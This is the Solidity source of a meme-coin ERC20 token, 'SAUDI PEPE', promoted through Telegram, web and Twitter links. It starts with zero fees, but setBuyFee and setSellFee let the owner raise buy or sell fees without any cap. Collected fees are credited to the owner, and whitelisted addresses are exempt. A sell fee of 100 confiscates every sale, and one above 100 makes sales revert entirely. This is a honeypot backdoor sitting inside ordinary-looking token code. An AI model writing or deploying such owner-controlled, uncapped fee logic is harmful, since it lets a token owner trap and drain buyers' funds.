// SAUDI PEPE
// Telegram: https://t.me/SAUDIPEPECOIN
// Web: https://saudipepecoin.com/
// Twitter: https://twitter.com/SAUDIPEPECOIN

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract SAUDIPEPE is Context, IERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;

    IUniswapV2Router02 private immutable uniswapRouter;
    address private immutable uniswapPair;

    uint256 public totalChargedFees;

    uint256 public buyFee;
    uint256 public sellFee;
    mapping(address => bool) public whitelist;

    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(
        string memory _tokenName,
        string memory _tokensymbol,
        uint256 initialSupply,
        address _uniswapRouter
    ) {
        _name = _tokenName;
        _symbol = _tokensymbol;

        _totalSupply = initialSupply.mul(10**_decimals);
        _balances[_msgSender()] = _totalSupply;

        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());

        buyFee = 0;
        sellFee = 0;

        whitelist[_msgSender()] = true; // Whitelist the owner

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    event TokenChargedFees(address indexed sender, uint256 amount, uint256 timestamp);

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override nonReentrant returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override nonReentrant returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance.sub(amount));
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance.sub(subtractedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 senderBalance = this.balanceOf(sender);
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        uint256 chargeAmount = 0;
        uint256 transferAmount = amount;

        // Check if sender or recipient is not in the whitelist
        if (!whitelist[sender] && !whitelist[recipient]) {
            // Buy
            if (sender == uniswapPair && buyFee > 0) {
                chargeAmount = amount.mul(buyFee).div(100);
            // Sell
            } else if (recipient == uniswapPair && sellFee > 0) {
                chargeAmount = amount.mul(sellFee).div(100);
            // Regular transfers (no fee)
            } else {
                chargeAmount = 0;
            }

            if (chargeAmount > 0) {
                transferAmount = transferAmount.sub(chargeAmount);
                totalChargedFees = totalChargedFees.add(chargeAmount);
                _balances[owner()] = _balances[owner()].add(chargeAmount);
                emit TokenChargedFees(sender, chargeAmount, block.timestamp);
            }
        }

        _balances[sender] = senderBalance.sub(amount);
        _balances[recipient] = _balances[recipient].add(transferAmount);

        emit Transfer(sender, recipient, transferAmount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setBuyFee(uint256 newBuyFee) external onlyOwner {        
        buyFee = newBuyFee;
    }

    function setSellFee(uint256 newSellFee) external onlyOwner {        
        sellFee = newSellFee;
    }

    function setWhitelist(address account, bool status) external onlyOwner {
        whitelist[account] = status;
    }

    function getTotalChargedFees() public view returns (uint256) {
        return totalChargedFees;
    }
}